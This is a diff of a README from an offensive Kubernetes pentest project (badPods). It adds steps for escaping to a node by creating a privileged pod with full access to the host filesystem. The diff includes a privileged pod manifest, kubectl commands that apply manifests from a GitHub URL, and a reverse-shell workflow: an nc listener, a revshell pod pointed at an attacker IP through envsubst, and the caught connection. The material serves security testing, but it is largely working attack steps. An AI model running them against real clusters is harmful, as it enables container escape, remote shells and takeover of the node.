@@ -2,20 +2,67 @@
 
 You are exploiting the fact that there are no polices preventing the creation of pod with access to the node's filesystem. You are going to create a pod and gain full read/write access to the filesystem of the node the pod is running on. 
 
-[pod-hostpid-only.yaml](pod-hostpid-only.yaml)
 
-### Create a pod
+# Pod Creation
+
+### Create a pod you can exec into
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-priv-only
+  labels: 
+    app: priv-only
+spec:
+  containers:
+  - name: priv-only
+    image: ubuntu
+    command: [ "/bin/bash", "-c", "--" ]
+    args: [ "while true; do sleep 30; done;" ]
+    securityContext:
+      privileged: true
+  # Force scheduling of your pod on a master mode by uncommenting the next line and changing the nodeName to that of a master node
+  #nodeName: k8s-master
+  ```
+[pod-priv-only.yaml](pod-priv-only.yaml)
+
+#### Option 1: Create pod from local yaml 
 ```bash
-# Option 1: Create pod from local yaml 
 kubectl apply -f pod-hostpid-only.yaml   
-# Option 2: Create pod from github hosted yaml
+```
+
+#### Option 2: Create pod from github hosted yaml
+```bash
 kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/hostpid-only/pod-hostpid-only.yaml  
 ```
 
 ### Exec into pod 
-```bash 
+```bash
 kubectl -n [namespace] exec -it pod-hostpid-only -- bash
 ```
+
+### Or, create a reverse shell pod
+[pod-hostpid-only-revshell.yaml](pod-hostpid-only-revshell.yaml)
+
+#### Set up listener
+```bash
+nc -nvlp 3116
+```
+
+#### Create the pod
+```bash
+# Option 1: Create pod from local yaml without modifying it by using env variables and envsubst
+HOST="10.0.0.1" PORT="3116" 
+envsubst < ./yaml/hostpid-only/pod-hostpid-only-revshell.yaml | kubectl apply -f -
+```
+
+#### Catch the shell and chroot to /host 
+```bash
+~ nc -nvlp 3116
+Listening on 0.0.0.0 3116
+Connection received on 10.0.0.162 42035
+```
+
 
 # Post exploitation
 ```bash
